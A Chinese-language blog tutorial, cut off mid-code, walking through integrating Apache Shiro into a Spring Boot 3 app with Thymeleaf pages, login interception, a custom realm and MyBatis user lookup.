<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span> <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>喵喵<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;msg&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hr</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">th:href</span>=<span class="string">&quot;@&#123;/user/add&#125;&quot;</span>&gt;</span>add<span class="tag">&lt;/<span class="name">a</span>&gt;</span> | <span class="tag">&lt;<span class="name">a</span> <span class="attr">th:href</span>=<span class="string">&quot;@&#123;/user/update&#125;&quot;</span>&gt;</span>update<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


</li>
<li><p>新建一个add.html页面</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>add<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


</li>
<li><p>新建一个update.htmp页面</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>update<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/&quot;, &quot;/index&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">ToIndex</span><span class="params">(Model model)</span>&#123;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;msg&quot;</span>,<span class="string">&quot;Hello,Shiro!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>; <span class="comment">// Ensure this matches the template file name</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/user/add&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">add</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;add&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/user/update&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">update</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;update&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/12/08/SpringBoot3%E6%95%B4%E5%90%88Shiro%E5%AD%A6%E4%B9%A0/image-20241208165234022.png" alt="image-20241208165234022"></p>
<h2 id="ShiroConfig"><a href="#ShiroConfig" class="headerlink" title="ShiroConfig"></a>ShiroConfig</h2><p>与SpringSecuity相同的是，我们需要为它创建COnfig配置文件</p>
<p>新建一个ShiroConfig</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShiroConfig</span> &#123;</span><br><span class="line">    <span class="comment">// ShiroFilterFactoryBean</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// DefaultWebSecurityManager</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//创建realm对象</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后定义一个realm实体类，它需要继承AuthorizingRealm类，并重写两个方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserRealm</span> <span class="keyword">extends</span> <span class="title class_">AuthorizingRealm</span> &#123;</span><br><span class="line">    <span class="comment">//授权</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> AuthorizationInfo <span class="title function_">doGetAuthorizationInfo</span><span class="params">(PrincipalCollection principalCollection)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; </span><br><span class="line">	</span><br><span class="line">    <span class="comment">//认证</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> AuthenticationInfo <span class="title function_">doGetAuthenticationInfo</span><span class="params">(AuthenticationToken authenticationToken)</span> <span class="keyword">throws</span> AuthenticationException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很眼熟，和SpringSecurity差不多嘛</p>
<p>现在重新再在写ShiroConfig</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShiroConfig</span> &#123;</span><br><span class="line">    <span class="comment">// ShiroFilterFactoryBean</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> ShiroFilterFactoryBean <span class="title function_">getShiroFilterFactoryBean</span><span class="params">(<span class="meta">@Qualifier</span> DefaultWebSecurityManager defaultWebSecurityManager)</span>&#123;</span><br><span class="line">        <span class="comment">// 设置安全管理器</span></span><br><span class="line">        <span class="type">ShiroFilterFactoryBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShiroFilterFactoryBean</span>();</span><br><span class="line">        bean.setSecurityManager(defaultWebSecurityManager);</span><br><span class="line">        <span class="keyword">return</span> bean;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="comment">// DefaultWebSecurityManager</span></span><br><span class="line">    <span class="keyword">public</span> DefaultWebSecurityManager <span class="title function_">getDefaultWebSecurityManager</span><span class="params">(<span class="meta">@Qualifier</span> UserRealm userRealm)</span> &#123;</span><br><span class="line">        <span class="type">DefaultWebSecurityManager</span> <span class="variable">securityManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultWebSecurityManager</span>();</span><br><span class="line">        <span class="comment">//关联UserRealm</span></span><br><span class="line">        securityManager.setRealm(userRealm);</span><br><span class="line">        <span class="keyword">return</span> securityManager;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建realm对象</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> UserRealm <span class="title function_">userRealm</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">UserRealm</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这比SpringSecuity复杂多了，配置好多…</p>
<h1 id="实现登录拦截"><a href="#实现登录拦截" class="headerlink" title="实现登录拦截"></a>实现登录拦截</h1><p>要实现登录拦截，要在getShiroFilterFactoryBean里添加代码,我们得先知道权限的管理</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">anon: 无需认证就可以访问</span></span><br><span class="line"><span class="comment">authc: 必须认证了才能访问</span></span><br><span class="line"><span class="comment">user: 必须拥有记住我功能才能用</span></span><br><span class="line"><span class="comment">perms: 拥有对某个资源的权限才能访问</span></span><br><span class="line"><span class="comment">role: 拥有某个角色权限才能访问</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map&lt;String, String&gt; filterMap = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();</span><br><span class="line">filterMap.put(<span class="string">&quot;/user/add&quot;</span>, <span class="string">&quot;authc&quot;</span>);</span><br><span class="line">filterMap.put(<span class="string">&quot;/user/update&quot;</span>, <span class="string">&quot;authc&quot;</span>);</span><br><span class="line">bean.setFilterChainDefinitionMap(filterMap);</span><br><span class="line">   </span><br></pre></td></tr></table></figure>

<p>在getShiroFilterFactoryBean里添加如上代码后，就成功的拦截了请求</p>
<p><img src="/2024/12/08/SpringBoot3%E6%95%B4%E5%90%88Shiro%E5%AD%A6%E4%B9%A0/image-20241208200036280.png" alt="image-20241208200036280"></p>
<p>但是要注意的是Shiro不像SpringSecurity有默认的登录界面，我们得手动写一个，这里就写一个最简单的登录框</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>登录页面喵<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>登录喵<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Controller里添加</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/toLogin&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toLogin</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;login&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/12/08/SpringBoot3%E6%95%B4%E5%90%88Shiro%E5%AD%A6%E4%B9%A0/image-20241208200316350.png" alt="image-20241208200316350"></p>
<p>现在当我们访问拦截的请求，就会自动重定向到我们的页面</p>
<h1 id="实现用户认证"><a href="#实现用户认证" class="headerlink" title="实现用户认证"></a>实现用户认证</h1><p>Shiro很多的东西都会放到<strong>Realm</strong>里，权限操作也就是在Realm里</p>
<p>编辑一个Mapping</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/login&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">login</span><span class="params">(String username, String password, Model model)</span> &#123;</span><br><span class="line">    <span class="comment">// 获取当前的用户</span></span><br><span class="line">    <span class="type">Subject</span> <span class="variable">subject</span> <span class="operator">=</span> SecurityUtils.getSubject();</span><br><span class="line">    <span class="comment">// 封装用户的登录数据</span></span><br><span class="line">    <span class="type">UsernamePasswordToken</span> <span class="variable">usernamePasswordToken</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UsernamePasswordToken</span>(username, password);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        subject.login(usernamePasswordToken); <span class="comment">// 执行登录方法，如果没有异常就说明OK了</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnknownAccountException e) &#123;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;用户名或者密码错误&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;login&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后改一下前端页面</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span> <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.thymeleaf.org&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>登录页面喵<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>登录喵<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">th:action</span>=<span class="string">&quot;@&#123;/login&#125;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span> = <span class="string">&quot;$&#123;msg&#125;&quot;</span> <span class="attr">style</span>=<span class="string">&quot;color: red&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2024/12/08/SpringBoot3%E6%95%B4%E5%90%88Shiro%E5%AD%A6%E4%B9%A0/image-20241208201850861.png" alt="image-20241208201850861"></p>
<p>这里点了一下提交后会发现执行了UserRealm里的方法，现在我们就可以在UserRealm里实现具体方法了  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> AuthenticationInfo <span class="title function_">doGetAuthenticationInfo</span><span class="params">(AuthenticationToken authenticationToken)</span> <span class="keyword">throws</span> AuthenticationException &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;执行认证&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">    <span class="type">UsernamePasswordToken</span> <span class="variable">token</span> <span class="operator">=</span> (UsernamePasswordToken) authenticationToken;</span><br><span class="line">    <span class="keyword">if</span> (!token.getUsername().equals(name)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">//抛出异常</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 密码认证，shiro做</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">SimpleAuthenticationInfo</span>(<span class="string">&quot;&quot;</span>, password, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h1 id="Shiro整合数据库"><a href="#Shiro整合数据库" class="headerlink" title="Shiro整合数据库"></a>Shiro整合数据库</h1><p>接下来连接数据库，密码从数据库里面取</p>
<h2 id="数据库相关环境"><a href="#数据库相关环境" class="headerlink" title="数据库相关环境"></a>数据库相关环境</h2><p>Maven里数据库Mysql驱动我一开始导过了</p>
<p>现在导入一下Mybatis的包，以及我习惯用的Lambox</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.18.36<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里我用以前我SpringSecurity时候创的表格，因为这个密码是SpringSecurity加密的，这里我改成123456</p>
<p><img src="/2024/12/08/SpringBoot3%E6%95%B4%E5%90%88Shiro%E5%AD%A6%E4%B9%A0/image-20241208203133921.png" alt="image-20241208203133921"></p>
<h2 id="配置数据库连接"><a href="#配置数据库连接" class="headerlink" title="配置数据库连接"></a>配置数据库连接</h2><p>配置application.yml</p>
<p><img src="/2024/12/08/SpringBoot3%E6%95%B4%E5%90%88Shiro%E5%AD%A6%E4%B9%A0/image-20241208205111395.png" alt="image-20241208205111395"></p>
<p>创建mapper软件包，在SpringBoot启动文件上添加包扫描，当然也可以在Mapper文件上添加@Mapper注解，但是推荐还是直接包扫描来的方便</p>
<p><img src="/2024/12/08/SpringBoot3%E6%95%B4%E5%90%88Shiro%E5%AD%A6%E4%B9%A0/image-20241208203658813.png" alt="image-20241208203658813"></p>
<p>创建UserMapper接口：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.study.shirostudy.mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.study.shirostudy.unti.User;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Select;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line"><span class="meta">@Select(&quot;SELECT * FROM user where username = #&#123;username&#125;&quot;)</span></span><br><span class="line">User <span class="title function_">queryUserByName</span><span class="params">(String username)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="创建实体类User："><a href="#创建实体类User：" class="headerlink" title="创建实体类User："></a>创建实体类User：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">src/main/java/com/study/shirostudy/unti/User.java</span><br><span class="line"><span class="meta">@Repository</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    String username;</span><br><span class="line">    String password;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="UserService-impl"><a href="#UserService-impl" class="headerlink" title="UserService&amp;&amp;impl"></a>UserService&amp;&amp;impl</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">queryUserByName</span><span class="params">(String username)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    UserMapper userMapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">queryUserByName</span><span class="params">(String username)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> userMapper.queryUserByName(username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ShiroStudyApplicationTests</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    UserService mapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">contextLoads</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(mapper.queryUserByName(<span class="string">&quot;admin&quot;</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>测试通过后，就可以把实际业务写入了</p>
<h1 id="Shiro用户授权"><a href="#Shiro用户授权" class="headerlink" title="Shiro用户授权"></a>Shiro用户授权</h1><p><code>ShiroConfig</code> 中的 <code>getShiroFilterFactoryBean</code> 方法添加认证代码</p>
<p><img src="/2024/12/08/SpringBoot3%E6%95%B4%E5%90%88Shiro%E5%AD%A6%E4%B9%A0/image-20241208215855798.png" alt="image-20241208215855798"></p>
<p>然后在Controller添加上未授权页面</p>
<p><img src="/2024/12/08/SpringBoot3%E6%95%B4%E5%90%88Shiro%E5%AD%A6%E4%B9%A0/image-20241208220032914-1733667513041-14.png" alt="image-20241208220032914"></p>
<ul>
<li><code>ShiroConfig</code> 中的 <code>getShiroFilterFactoryBean</code> 方法中添加</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//未授权页面</span></span><br><span class="line">bean.setUnauthorizedUrl(<span class="string">&quot;/noauth&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="UserRealm-类的修改"><a href="#UserRealm-类的修改" class="headerlink" title="UserRealm 类的修改"></a>UserRealm 类的修改</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.study.shirostudy.controller;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.study.shirostudy.Service.UserService;</span><br><span class="line"><span class="keyword">import</span> com.study.shirostudy.unti.User;</span><br><span class="line"><span class="keyword">import</span> jakarta.annotation.Resource;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.SecurityUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authz.AuthorizationInfo;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.realm.AuthorizingRealm;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.subject.PrincipalCollection;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.subject.Subject;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserRealm</span> <span class="keyword">extends</span> <span class="title class_">AuthorizingRealm</span> &#123;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    UserService userService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> AuthorizationInfo <span class="title function_">doGetAuthorizationInfo</span><span class="params">(PrincipalCollection principalCollection)</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;执行授权&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> AuthenticationInfo <span class="title function_">doGetAuthenticationInfo</span><span class="params">(AuthenticationToken authenticationToken)</span> <span class="keyword">throws</span> AuthenticationException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行认证&quot;</span>);</span><br><span class="line">        <span class="type">UsernamePasswordToken</span> <span class="variable">userToken</span> <span class="operator">=</span> (UsernamePasswordToken) authenticationToken;</span><br><span class="line">        <span class="comment">// 连接真实数据库</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> userService.queryUserByName(userToken.getUsername());</span><br><span class="line">        <span class="keyword">if</span> (user == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// 抛出异常 UnknownAccountException</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 密码认证，shiro做</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title 